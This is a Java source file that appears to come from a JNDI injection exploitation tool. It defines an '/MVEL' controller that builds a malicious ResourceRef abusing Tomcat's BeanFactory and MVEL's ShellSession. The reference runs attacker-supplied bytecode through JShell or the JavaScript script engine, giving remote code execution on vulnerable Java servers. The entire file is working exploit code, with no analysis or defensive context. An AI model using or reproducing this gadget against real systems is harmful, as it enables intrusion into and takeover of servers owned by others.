package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JShellPayload;
import map.jndi.payload.JavaScriptPayload;
import map.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.net.URLEncoder;

@JNDIController
@JNDIMapping("/MVEL")
public class MVELController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + MVEL");

        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=exec"));

        if (Main.config.jshell) {
            String code = JShellPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "push Class.forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(java.net.URLDecoder.decode(\"" + URLEncoder.encode(code) + "\"));"));
        } else {
            String code = JavaScriptPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "push Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + MiscUtil.encodeUnicode(code) + "\");"));
        }

        return ref;
    }
}
